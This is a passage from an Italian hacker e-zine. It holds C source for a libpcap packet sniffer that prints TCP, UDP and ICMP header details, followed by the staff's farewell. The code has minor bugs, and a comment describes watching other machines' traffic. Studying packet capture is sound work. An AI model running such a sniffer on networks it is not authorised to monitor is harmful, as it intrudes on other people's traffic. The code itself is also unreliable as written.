#define ICMP_PREC_VIOLATION	14	/* Precedence violation */
#define ICMP_PREC_CUTOFF	15	/* Precedence cut off */
#define NR_ICMP_UNREACH		15	/* instead of hardcoding immediate value */

/* Codes for REDIRECT. */
#define ICMP_REDIR_NET		0	/* Redirect Net			*/
#define ICMP_REDIR_HOST		1	/* Redirect Host		*/
#define ICMP_REDIR_NETTOS	2	/* Redirect Net for TOS		*/
#define ICMP_REDIR_HOSTTOS	3	/* Redirect Host for TOS	*/

/* Codes for TIME_EXCEEDED. */
#define ICMP_EXC_TTL		0	/* TTL count exceeded		*/
#define ICMP_EXC_FRAGTIME	1	/* Fragment Reass time exceeded	*/

u_short offset;



u_char* handle_TCP(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*packet);
u_char* handle_UDP(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*packet);
u_char* handle_ICMP(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*packet);


void my_callback(u_char *useless,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{

  struct my_ip* ip;

  static int count=1;
  int size_ip = sizeof(struct my_ip);

  ip = (struct my_ip*)(packet);



switch(ip->ip_p){

	case IPPROTO_TCP: 	handle_TCP(NULL,pkthdr,packet);
	break;
	case IPPROTO_UDP:  	handle_UDP(NULL,pkthdr,packet);
	break;
	case IPPROTO_ICMP:	handle_ICMP(NULL,pkthdr,packet);
	break;

	default:break;
	}


}

int main(int argc,char **argv)
{


    int i;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* descr;
    const u_char *packet;
    struct pcap_pkthdr hdr;     /* pcap.h                    */
    struct ether_header *eptr;  /* net/ethernet.h            */
    struct bpf_program fp;      /* hold compiled program     */
    bpf_u_int32 maskp;          /* subnet mask               */
    bpf_u_int32 netp;           /* ip                        */
    u_char* args = NULL;
    int datalink;




    if(argc < 2){
     	fprintf(stdout,"\n\nSNIFCAP by CityHunter V0.6 NO(C) -NoFlyZone-\n\n");
    	fprintf(stdout,"Usage: %s interface \"filter program\"\n",argv[0]);return 0;
		}
    printf("\n\n\t\t_____________________________\n\n");
    fflush(stdout); sleep(1);
    printf("\t\t\033[02A   SNIFCAP is now working... \n\n");
    fflush(stdout);

    /* grab a device to peak into... */
    dev = argv[1];
    if(dev == NULL)
    { fprintf(stderr,"%s\n",errbuf); exit(1);

      }else printf("Using device: %s\n",dev);

    /* ask pcap for the network address and mask of the device */
    pcap_lookupnet(dev,&netp,&maskp,errbuf);

    /* open device for reading this time lets set it in promiscuous
     * mode so we can monitor traffic to another machine             */
    descr = pcap_open_live(dev,BUFSIZ,0,-1,errbuf);
    if(descr == NULL)
    { printf("pcap_open_live(): %s\n",errbuf); exit(1); }

    if ((datalink = pcap_datalink(descr)) < 0) {
    	fprintf(stderr, "pcap_datalink: %s\n", errbuf);
    	exit(0);
  	}
  	switch (datalink) {
    	case DLT_EN10MB:
      		offset = 14;
      		break;
    	case DLT_NULL:
    	case DLT_PPP:
      		offset = 4;
      		break;
    	case DLT_SLIP:
      		offset = 16;
      		break;
    	case DLT_RAW:
      		offset = 0;
      		break;
    	case DLT_SLIP_BSDOS:
    	case DLT_PPP_BSDOS:
      		offset = 24;
      		break;
    	default:
      		fprintf(stderr, "Unknown Datalink Type: (%d)", datalink);
      		exit(-1);
  	}



if(argc > 2)
    {
    /* Lets try and compile the program.. non-optimized */
    if(pcap_compile(descr,&fp,argv[2],0,netp) == -1)
    { fprintf(stderr,"Error calling pcap_compile\n"); exit(1); }

    /* set the compiled program as the filter */
    if(pcap_setfilter(descr,&fp) == -1)
    { fprintf(stderr,"Error setting filter\n"); exit(1); }
}

    /* ... and loop*/
    pcap_loop(descr,-1,my_callback,args);

    return 0;
}




u_char* handle_TCP
        (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*
        packet)
{
  struct my_ip* ip;
  struct TCPhdr* tcp;
  struct servent *service;
  char *flags;



 int size_ip = sizeof(struct my_ip);
 int size_tcp = sizeof(struct TCPhdr);


 ip = (struct my_ip*)(packet+offset);
 tcp = (struct TCPhdr*)(packet+size_ip+offset);


 service = getservbyport(htons(ntohs(tcp->th_sport)), "tcp");
 printf("\n---[TCP]-------------------------------------------------------------------\n\n");
 printf("From  %s:%d(%s)",inet_ntoa(ip->ip_src),ntohs(tcp->th_sport),(service) ? service->s_name : "unknown");
 service = getservbyport(htons(ntohs(tcp->th_dport)), "tcp");
 printf("\tto  %s:%d(%s)\n",inet_ntoa(ip->ip_dst),ntohs(tcp->th_dport),(service) ? service->s_name : "unknown");
 printf("TTL: %d\t Window: %d\t SEQ: %u ACK: %u\n",(ip->ip_ttl),(ntohs(tcp->th_win)),ntohl(tcp->th_seq),ntohl(tcp->th_ack));
 printf("Version: %d\t Total Lenght: %d\t",IP_V(ip),ntohs(ip->ip_len));


 switch (tcp->th_flags) {
		case TH_URG:
                	flags="-----U";
                        break;
                case TH_ACK|TH_PUSH:
                        flags="---PA-";
                        break;
                case TH_SYN|TH_ACK:
                        flags="-S--A-";
                        break;
                case TH_FIN|TH_ACK:
                        flags="F---A-";
                        break;
                case TH_ACK:
                        flags="----A-";
                        break;
                case TH_PUSH:
                        flags="---P--";
                        break;
                case TH_RST:
                        flags="--R---";
                        break;
                case TH_SYN:
                        flags="-S----";
                        break;
                case TH_FIN:
                        flags="F-----";
			break;
		default:
			break;
	}
	printf("FLAGS: %s\n",flags);



}

u_char* handle_UDP
        (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*
        packet)

	{
  struct my_ip* ip;
  struct UDPhdr* udp;
  struct servent *service;




 int size_ip = sizeof(struct my_ip);
 int size_udp = sizeof(struct UDPhdr);

 ip = (struct my_ip*)(packet+offset);
 udp = (struct UDPhdr*)(packet+size_ip+offset);


 service = getservbyport(htons(ntohs(udp->uh_sport)), "udp");
 printf("\n---[UDP]-------------------------------------------------------------------\n\n");
 printf("From  %s:%d(%s)",inet_ntoa(ip->ip_src),ntohs(udp->uh_sport),(service) ? service->s_name : "unknown");
 service = getservbyport(htons(ntohs(udp->uh_dport)), "tcp");
 printf("\tto  %s:%d(%s)\n",inet_ntoa(ip->ip_dst),ntohs(udp->uh_dport),(service) ? service->s_name : "unknown");
 printf("Version: %d\t Total Lenght: %d\t",IP_V(ip),ntohs(ip->ip_len));
 printf("TTL: %d\n",(ip->ip_ttl));


}


u_char* handle_ICMP
        (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*
        packet)

	{
  struct my_ip* ip;
  struct ICMPhdr* icmp;





 int size_ip = sizeof(struct my_ip);
 int size_icmp = sizeof(struct ICMPhdr);

 ip = (struct my_ip*)(packet+offset);
 icmp = (struct ICMPhdr*)(packet+size_ip+offset);


 printf("\n---[ICMP]------------------------------------------------------------------\n\n");
 printf("From  %s",inet_ntoa(ip->ip_src));
 printf("\tto  %s\n",inet_ntoa(ip->ip_dst));
 printf("Version: %d\t Total Lenght: %d\t",IP_V(ip),ntohs(ip->ip_len));
 printf("TTL: %d\tType: ",(ip->ip_ttl));

 switch((icmp->type)) {
		case 0:
			printf("Echo reply\n");
			break;
		case 3:
			printf("Dest_unreach\n");
			break;
		case 4:
			printf("Source quench\n");
			break;
		case 5:
			printf("Redirect\n");
			break;
		case 8:
			printf("Echo\n");
			break;
		case 11:
			printf("Time exceeded\n");
			break;
		case 12:
			printf("Parameter problem\n");
			break;
		case 13:
			printf("Timestamp\n");
			break;
		case 14:
			printf("Timestamp reply\n");
			break;
		case 15:
			printf("Information\n");
			break;
		case 16:
			printf("Information reply\n");
			break;
		case 17:
			printf("Address mask\n");
			break;
		case 18:
			printf("Address mask reply\n");
			break;
		default:
			printf("%i\n", icmp->type);
			break;
	}




}

/*compilare come scritto sopra*/

------------------------------------<END>--------------------------------------


------------------------------------<32>---------------------------------------
-----------------------------<NoFlyZone Staff>---------------------------------
--------------------------------<Greetings>------------------------------------

Siamo arrivati alla fine di questo numero...Questo caldo infernale non ci ha 
fermato,chi fortunato in possesso di un condizionatore,tutto sommato,ha scritto
per voi in condizioni quasi ottimali,chi vi scrive al contrario è dimagrito di un
paio di chili per un guasto al proprio condizionatore,ma sono qui ugualmente 
a proporvi questa nuova lettura.......Questo numero mi sembra decisamente
superiore ai precedenti,avrete sicuramente notato le novità : come i source ,
raramente inseriti nei precedenti numeri.Vogliamo diffondere in rete nuovi tools
made NoFlyZone staff , questo ci ha impegnato tantissimo , ci ha fatto studiare 
parecchio,e siamo orgogliosi di averlo fatto.Stiamo sviluppando nuovi progetti 
per i prossimi numeri : il nuovo sito è in costruzione come potete vedere sta 
venendo su bene,abbiamo comprato il nuovo dominio noflyzone.org , tra poco po-
trete ascoltare in rete la Radio NoFlyZone con interessanti discussioni riguar-
danti informatica e certamente buona musica,e tante altre novità bollono in 
pentola ed anticiparle sarebbe un peccato.Siamo sicuri che continuerete a seguirci
ed a darci nuovi stimoli per fare di NoFlyZone qualcosa di "unico".
I presupposti per fare un buon lavoro ci sono tutti e non finirò mai di 
ringraziare tutti coloro che ci seguono,coloro i quali mandano email anche critiche
perché queste ci aiutano a crescere.Ringrazio tutto lo staff NoFlyZone e coloro
i quali hanno dato il loro contributo..E` chiaro che nel periodo estivo ci sarà 
un rallentamento,dovuto alle nostre stupende spiagge ed alle nostre stupende 
donne sempre più svestite che purtroppo ci rendono meno propensi a trascorrere 
diverse ore davanti ad un pc,ma nelle giornate con mare forza 9 e con una serie 
di cozze all'orizzonte saremo sempre qui a cercare di preparare qualcosa per voi,
un piccolo speciale estivo, che possa impedirvi di dimenticarci..NoFlyZone augura
a tutti voi lettori una stupenda estate ricca di mare , di .... , di ricche 
bevute di bionde irlandesi ( quella che preferisco :P ) e per coloro i quali stanno
affrontando gli studi : non mollate , gli esami non finisco mai , vedi NoFlyZone
la vostra rivista preferita...
                          
                                                                 []Lord[V]icio[]
                                                                   NoFlyZone staff 


www.noflyzone.org
IRC:	irc.azzurra.org		port: 6667 chan: #noflyzone
	

------------------------------------<END>--------------------------------------


Mode E-Zine off...See ya!





